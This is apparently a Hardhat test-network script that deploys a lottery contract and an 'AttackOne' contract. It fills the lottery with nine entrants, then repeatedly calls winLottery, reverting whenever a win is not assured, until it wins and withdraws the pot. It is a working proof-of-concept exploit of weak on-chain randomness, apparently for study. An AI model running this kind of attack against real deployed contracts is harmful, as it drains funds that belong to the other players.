const { ethers } = require("hardhat");

async function main(quorum) {
    // deploy lottery contract
    const accounts = await ethers.getSigners();
    const Lottery = await ethers.getContractFactory("Lottery");
    const lottery = await Lottery.deploy(quorum,10,1);
    console.log(`lottery deployed to ${lottery.address}`)

    // deploy attack contract
    const AttackOne = await ethers.getContractFactory("AttackOne");
    const attackOne = await AttackOne.deploy(lottery.address, accounts[9].address);
    console.log(`attack contract deployed to ${attackOne.address}`)

    // set up conditions to prime the attack
    // (quorum - 1) persons enter the lottery with 1 ETH
    for (i = 0; i < quorum - 1; i++) {
        await ethers.provider.send(`evm_mine`);
        await lottery.connect(accounts[i]).enter({
            value: ethers.utils.parseEther("1.0")});
    }

    // attack!
    let won = false;
    while (won == false) {
        try {
            await ethers.provider.send(`evm_mine`);
            balBefore = ethers.utils.formatEther(await ethers.provider.getBalance(attackOne.address));
            await attackOne.connect(accounts[9]).winLottery({
                value: ethers.utils.parseEther("1.0")});
            balAfter = ethers.utils.formatEther(await ethers.provider.getBalance(attackOne.address));
            if (balAfter > balBefore) {
                won = true;
                console.log("We just won the lottery! Now withdrawing funds from attack contract...")
            }
        } catch {
            console.log("We wouldn't have won the lottery this time, so let's skip buying a ticket")
        }        
    }
    // withdraw funds from attacking contract
    await attackOne.connect(accounts[quorum-1]).withdrawAll();

}

main(10)
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });